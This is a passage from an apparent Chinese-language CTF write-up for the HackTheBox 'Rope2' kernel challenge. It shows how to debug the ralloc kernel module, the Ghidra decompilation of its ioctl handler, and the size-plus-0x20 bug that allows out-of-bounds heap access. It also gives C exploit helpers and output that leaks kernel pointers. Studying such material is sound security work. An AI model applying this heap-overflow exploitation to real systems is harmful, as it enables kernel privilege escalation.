<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debugStub.port.guest64 = <span class="string">&quot;8865&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="安装ralloc"><a href="#安装ralloc" class="headerlink" title="安装ralloc"></a>安装ralloc</h3><p>将通过SSH或使用VMWare Tools将模块复制到VM中，以便在VM中共享一个文件夹。要加载模块，可以简单地使用insmod(插入模块):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ubuntu:~/rope2$ sudo insmod ./ralloc.ko</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="built_in">test</span>:</span><br></pre></td></tr></table></figure>

<p>现在它显示在lsmod(列表模块)中，并且创建了设备:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ubuntu:~/rope2$ lsmod | grep ralloc</span><br><span class="line">ralloc                 16384  0</span><br><span class="line"><span class="built_in">test</span>@ubuntu:~/rope2$ <span class="built_in">ls</span> /dev/ralloc</span><br><span class="line">/dev/ralloc</span><br></pre></td></tr></table></figure>

<p>可以通过在&#x2F;proc&#x2F;modules中grepping找到它在内存中的地址:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ubuntu:~/rope2$ sudo <span class="built_in">cat</span> /proc/modules | grep ralloc</span><br><span class="line">ralloc 16384 0 - Live 0xffffffffc0605000 (OE)</span><br></pre></td></tr></table></figure>

<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>从PowerShell导入一个wsl bash shell:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; bash</span><br><span class="line"><span class="built_in">test</span>@DESKTOP-9LSPC40:/mnt/c/Users/Administrator$</span><br></pre></td></tr></table></figure>

<p>按照页面上的说明在这个环境中安装<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2h1Z3N5L2dlZg==">GEF<i class="fa fa-external-link-alt"></i></span>(尝试过<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xvbmdsZC9wZWRh">Peda<i class="fa fa-external-link-alt"></i></span>，但它与内核调试不太匹配)。</p>
<p>当运行gdb时，需要将它指向正在调试的内核。因为已经安装了调试symbols，所以可以把内核从&#x2F;usr&#x2F;lib&#x2F;debug&#x2F;boot中取出:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/debug/boot/vmlinux-5.0.0-38-generic</span><br></pre></td></tr></table></figure>

<p>现在将在内核文件上启动gdb，并将目标设置为remote:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@DESKTOP-9LSPC40:~/rope2<span class="comment"># gdb -q ./vmlinux-5.0.0-38-generic</span></span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">&#x27; to start, `gef config&#x27;</span> to configure</span><br><span class="line">92 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">&#x27; to start, `gef config&#x27;</span> to configure</span><br><span class="line">92 commands loaded <span class="keyword">for</span> GDB 9.2 using Python engine 3.8</span><br><span class="line">Reading symbols from ./vmlinux-5.0.0-38-generic...</span><br><span class="line">gef➤  target remote:8864</span><br><span class="line">Remote debugging using :8864</span><br></pre></td></tr></table></figure>

<p>现在，要把ralloc文件添加到本地gdb实例中。这使gdb能够设置断点</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  add-symbol-file ralloc.ko 0xffffffffc0605000</span><br><span class="line">add symbol table from file <span class="string">&quot;ralloc.ko&quot;</span> at</span><br><span class="line">        .text_addr = 0xffffffffc05fb000</span><br><span class="line">Reading symbols from ralloc.ko...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ralloc.ko)</span><br></pre></td></tr></table></figure>

<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="通用结构"><a href="#通用结构" class="headerlink" title="通用结构"></a>通用结构</h3><p>需要弄清楚这个模块做什么，所以将在Ghidra打开ralloc.ko。该模块导出了两个函数，rope2_init 和 rope2_exit:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot.jpg"></li>
</ul>
<p>它们都非常简单，rope2_init调用misc_register, rope2_exit调用misc_dereregister来创建和删除设备。还有其他一些函数，但只有一个真正有趣，是rope2_ioctl。</p>
<h3 id="IOCTL"><a href="#IOCTL" class="headerlink" title="IOCTL"></a>IOCTL</h3><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>这段代码有两个用于管理数据的结构体，所以花了一分钟阅读代码，看看这些结构是如何使用的，然后在Ghidra中创建它们。我第一个调用了ralloc_in，它被用来管理通过ioctl传递的数据被调用:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot1.jpg"></li>
</ul>
<p>另一个命名为ralloc_array。这用于命名为buffers的全局变量，该变量最多可以容纳32 (0x20)个缓冲区。每个对象为缓冲区存储一个大小和一个地址:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb-rope2-getroot2.jpg"></li>
</ul>
<h3 id="rope2-ioctl"><a href="#rope2-ioctl" class="headerlink" title="rope2_ioctl"></a>rope2_ioctl</h3><p>一旦将这些应用到代码中的变量上，就会得到非常清晰的结果。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">long rope2_ioctl(undefined8 fd,int ioctl_num)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  long addr;</span><br><span class="line">  long user_input_;</span><br><span class="line">  ulong <span class="built_in">id</span>;</span><br><span class="line">  long <span class="built_in">return</span>;</span><br><span class="line">  long in_GS_OFFSET;</span><br><span class="line">  long user_input;</span><br><span class="line">  ulong user_input.size;</span><br><span class="line">  void *user_input.data;</span><br><span class="line">  long _canary;</span><br><span class="line">  long canary;</span><br><span class="line">  void *__src;</span><br><span class="line">  void *__dest;</span><br><span class="line">  </span><br><span class="line">  __fentry__();</span><br><span class="line">  canary = *(long *)(in_GS_OFFSET + 0x28);</span><br><span class="line">  mutex_lock(lock);</span><br><span class="line">  _copy_from_user(&amp;user_input,user_input_,0x18);</span><br><span class="line">  <span class="keyword">if</span> (ioctl_num == 0x1000) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((user_input.size &lt; <span class="number">0</span>x401) &amp;&amp; ((uint)user_input &lt; <span class="number">0</span>x20)) &#123;</span><br><span class="line">      <span class="built_in">id</span> = (ulong)(uint)user_input * 0x10;</span><br><span class="line">      <span class="keyword">if</span> (*(long *)(arr + <span class="built_in">id</span> + 8) == 0) &#123;</span><br><span class="line">        addr = __kmalloc(user_input.size,0x6000c0);</span><br><span class="line">        *(long *)(arr + <span class="built_in">id</span> + 8) = addr;</span><br><span class="line">        <span class="keyword">if</span> (addr != 0) &#123;</span><br><span class="line">          *(ulong *)(arr + <span class="built_in">id</span>) = user_input.size + 0x20;</span><br><span class="line">          <span class="built_in">return</span> = 0;</span><br><span class="line">          goto LAB_00100104;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ioctl_num == 0x1001) &#123;</span><br><span class="line">      <span class="keyword">if</span> (((uint)user_input &lt; <span class="number">0</span>x20) &amp;&amp; (*(long *)(arr + (ulong)(uint)user_input * <span class="number">0</span>x10 + <span class="number">8</span>) != <span class="number">0</span>)) &#123;</span><br><span class="line">        kfree();</span><br><span class="line">        *(undefined8 *)(arr + (ulong)(uint)user_input * 0x10 + 8) = 0;</span><br><span class="line">        <span class="built_in">return</span> = 0;</span><br><span class="line">        goto LAB_00100104;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (ioctl_num == 0x1002) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((uint)user_input &lt; <span class="number">0</span>x20) &#123;</span><br><span class="line">          if ((*(void **)(arr + (ulong)(uint)user_input * <span class="number">0</span>x10 + <span class="number">8</span>) != (void *)<span class="number">0</span>x0) &amp;&amp;</span><br><span class="line">             (__dest = *(void **)(arr + (ulong)(uint)user_input * <span class="number">0</span>x10 + <span class="number">8</span>), __src = user_input.data</span><br><span class="line">             , (user_input.size &amp; <span class="number">0</span>xffffffff) &lt; *(ulong *)(arr + (ulong)(uint)user_input * <span class="number">0</span>x10) ||</span><br><span class="line">               (user_input.size &amp; <span class="number">0</span>xffffffff) == *(ulong *)(arr + (ulong)(uint)user_input * <span class="number">0</span>x10)))</span><br><span class="line">          goto joined_r0x001001ec;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((ioctl_num == <span class="number">0</span>x1003) &amp;&amp; ((uint)user_input &lt; <span class="number">0</span>x20)) &#123;</span><br><span class="line">          __src = *(void **)(arr + (ulong)(uint)user_input * 0x10 + 8);</span><br><span class="line">          <span class="keyword">if</span> ((__src != (void *)<span class="number">0</span>x0) &amp;&amp;</span><br><span class="line">             (__dest = user_input.data,</span><br><span class="line">             (user_input.size &amp; <span class="number">0</span>xffffffff) &lt;= *(ulong *)(arr + (ulong)(uint)user_input * <span class="number">0</span>x10))) &#123;</span><br><span class="line">joined_r0x001001ec:</span><br><span class="line">            <span class="keyword">if</span> (((ulong)user_input.data &amp; <span class="number">0</span>xffff000000000000) == <span class="number">0</span>) &#123;</span><br><span class="line">              memcpy(__dest,__src,user_input.size &amp; <span class="number">0</span>xffffffff);</span><br><span class="line">              return = <span class="number">0</span>;</span><br><span class="line">              goto LAB_00100104;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return = -<span class="number">1</span>;</span><br><span class="line">LAB_00100104:</span><br><span class="line">  mutex_unlock(lock);</span><br><span class="line">  if (canary == *(long *)(in_GS_OFFSET + <span class="number">0</span>x28)) &#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>进一步优化后的代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">long rope2_ioctl(undefined8 fd,int ioctl_num,long input_struct)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  long _canary;</span><br><span class="line">  void *__dest;</span><br><span class="line">  void *__src;</span><br><span class="line">  long addr;</span><br><span class="line">  long user_input_;</span><br><span class="line">  ulong <span class="built_in">id</span>;</span><br><span class="line">  long <span class="built_in">return</span>;</span><br><span class="line">  long in_GS_OFFSET;</span><br><span class="line">  ralloc_in user_input;</span><br><span class="line">  </span><br><span class="line">  __fentry__();</span><br><span class="line">  _canary = *(long *)(in_GS_OFFSET + 0x28);</span><br><span class="line">  mutex_lock(lock);</span><br><span class="line">  _copy_from_user(&amp;user_input,user_input_,0x18);</span><br><span class="line">                    /* ADD */</span><br><span class="line">  <span class="keyword">if</span> (ioctl_num == 0x1000) &#123;</span><br><span class="line">    <span class="built_in">id</span> = (ulong)(uint)user_input.id;</span><br><span class="line">    <span class="keyword">if</span> ((user_input.size &lt; <span class="number">0</span>x401) &amp;&amp; ((uint)user_input.id &lt; <span class="number">0</span>x20)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (buffers[<span class="built_in">id</span>].address == 0) &#123;</span><br><span class="line">        addr = __kmalloc(user_input.size,0x6000c0);</span><br><span class="line">        buffers[<span class="built_in">id</span>].address = addr;</span><br><span class="line">        <span class="keyword">if</span> (addr != 0) &#123;</span><br><span class="line">          buffers[<span class="built_in">id</span>].size = user_input.size + 0x20;</span><br><span class="line">          <span class="built_in">return</span> = 0;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">                    /* Delete */</span><br><span class="line">    <span class="keyword">if</span> (ioctl_num == 0x1001) &#123;</span><br><span class="line">      <span class="keyword">if</span> (((uint)user_input.id &lt; <span class="number">0</span>x20) &amp;&amp; (buffers[(uint)user_input.id].address != <span class="number">0</span>)) &#123;</span><br><span class="line">        kfree();</span><br><span class="line">        buffers[(uint)user_input.id].address = 0;</span><br><span class="line">        <span class="built_in">return</span> = 0;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">                    /* Write */</span><br><span class="line">      <span class="keyword">if</span> (ioctl_num == 0x1002) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((uint)user_input.id &lt; <span class="number">0</span>x20) &#123;</span><br><span class="line">          if (((void *)buffers[(uint)user_input.id].address != (void *)<span class="number">0</span>x0) &amp;&amp;</span><br><span class="line">             (__dest = (void *)buffers[(uint)user_input.id].address, __src = user_input.data,</span><br><span class="line">             (user_input.size &amp; <span class="number">0</span>xffffffff) &lt; buffers[(uint)user_input.id].size ||</span><br><span class="line">             (user_input.size &amp; <span class="number">0</span>xffffffff) == buffers[(uint)user_input.id].size))</span><br><span class="line">          goto joined_r0x001001ec;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">                    /* Read */</span><br><span class="line">        <span class="keyword">if</span> ((ioctl_num == <span class="number">0</span>x1003) &amp;&amp; ((uint)user_input.id &lt; <span class="number">0</span>x20)) &#123;</span><br><span class="line">          __src = (void *)buffers[(uint)user_input.id].address;</span><br><span class="line">          <span class="keyword">if</span> ((__src != (void *)<span class="number">0</span>x0) &amp;&amp;</span><br><span class="line">             (__dest = user_input.data,</span><br><span class="line">             (user_input.size &amp; <span class="number">0</span>xffffffff) &lt;= buffers[(uint)user_input.id].size)) &#123;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (((ulong)user_input.data &amp; <span class="number">0</span>xffff000000000000) == <span class="number">0</span>) &#123;</span><br><span class="line">        memcpy(__dest,__src,user_input.size &amp; <span class="number">0</span>xffffffff);</span><br><span class="line">        return = <span class="number">0</span>;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        return = -<span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  mutex_unlock(lock);</span><br><span class="line">  if (_canary == *(long *)(in_GS_OFFSET + <span class="number">0</span>x28)) &#123;</span><br><span class="line">    <span class="built_in">return</span> <span class="built_in">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">  __stack_chk_fail();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>基本上，在4个可能的输入代码上有一个switch语句来执行添加(0x1000)、删除(0x1001)、写入(0x1002)和读取(0x1003)。</p>
<p>漏洞在于如何添加新块。有一个检查来确保块不大于0x400，并且id小于32，然后将大小保存到比缓冲区大0x20字节的缓冲区列表中。这允许在缓冲区的末端之外进行读写操作。</p>
<h2 id="基本相互作用"><a href="#基本相互作用" class="headerlink" title="基本相互作用"></a>基本相互作用</h2><p>开始写一个c程序，将与设备交互，包括一些帮助函数，以进行每个IOCTL调用:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/ioctl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line">int fd;</span><br><span class="line"></span><br><span class="line">struct user_data_struct &#123;</span><br><span class="line">    uint64_t <span class="built_in">id</span>;</span><br><span class="line">    uint64_t size;</span><br><span class="line">    void* data;</span><br><span class="line">&#125; user_data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long create_buf(uint64_t <span class="built_in">id</span>, uint64_t size)&#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1000, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">long delete_buf(uint64_t <span class="built_in">id</span>) &#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1001, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long write_buf(uint64_t <span class="built_in">id</span>, uint64_t size, void *data)&#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    user_data.data = data;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1002, &amp;user_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">long read_buf(uint64_t <span class="built_in">id</span>, uint64_t size, void *data)&#123;</span><br><span class="line">    user_data.id = <span class="built_in">id</span>;</span><br><span class="line">    user_data.size = size;</span><br><span class="line">    user_data.data = data;</span><br><span class="line">    <span class="built_in">return</span> ioctl(fd, 0x1003, &amp;user_data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，将从一个简单的main开始，它打开设备，清除缓冲区，创建一个缓冲区，向它写入0x40字节的As，然后从它读取0x420字节:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc) &#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ralloc&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == -1) &#123;</span><br><span class="line">        fprintf(stderr, <span class="string">&quot;Failed to open /dev/ralloc&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0; i &lt; 0x20; i++)&#123;</span><br><span class="line">        delete_buf(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    create_buf(1, 0x400);</span><br><span class="line"></span><br><span class="line">    uint64_t *input = malloc(0x400);</span><br><span class="line">    memset(input, 0x41, 0x40);</span><br><span class="line">    write_buf(1, 0x40, input);</span><br><span class="line"></span><br><span class="line">    uint64_t *output = malloc(0x420);</span><br><span class="line">    read_buf(1, 0x420, output);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0; i &lt; 0x420/8; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (i % 4 == 0) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n%03x: &quot;</span>, i*8);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%016lx &quot;</span>, output[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当运行这个，得到的结果匹配所期望的:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">test</span>@ropetest:~$ ./exploit</span><br><span class="line"></span><br><span class="line">000: 4141414141414141 4141414141414141 4141414141414141 4141414141414141 &lt;-- 0x40 bytes of A</span><br><span class="line">020: 4141414141414141 4141414141414141 4141414141414141 4141414141414141 </span><br><span class="line">040: 6c732f6c656e7265 61686769732f6261 65686361635f646e 2f70756f7267632f &lt;-- random stuff <span class="keyword">in</span> 0x400 byte buffer</span><br><span class="line">060: 5f646e6168676973 3039286568636163 6f69737365733a35 732e343939312d6e </span><br><span class="line">080: 5553002965706f63 3d4d455453595342 530070756f726763 39383d4d554e5145 </span><br><span class="line">0a0: 5f43455355003632 494c414954494e49 313631313d44455a 3339353439323531 </span><br><span class="line">0c0: ffff9880f48c0000 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">0e0: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">100: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">120: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">140: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">160: dead000000000200 dead000000000100 dead000000000200 dead000000000100 </span><br><span class="line">180: dead000000000200 dead000000000100 dead000000000200 ffff9880f48c7598 </span><br><span class="line">1a0: ffff9880f48c7598 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">1c0: 0000000000000000 ffff9880f48c75c8 ffff9880f48c75c8 ffff9880f48c75d8 </span><br><span class="line">1e0: ffff9880f48c75d8 ffff9880f48c75e8 ffff9880f48c75e8 0000000000000000 </span><br><span class="line">200: 0000000000000000 0000000000000000 0000000000000000 ffff987fa5bf3800 </span><br><span class="line">220: 0000000000000218 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">240: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">260: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">280: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">2a0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">2c0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">2e0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">300: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">320: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">340: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">360: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">380: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">3a0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">3c0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">3e0: 0000000000000000 0000000000000000 0000000000000000 0000000000000000 </span><br><span class="line">400: ffffffff960c4f20 ffffffff9655c3c0 ffffffff96067120 ffffffff96711080 &lt;-- 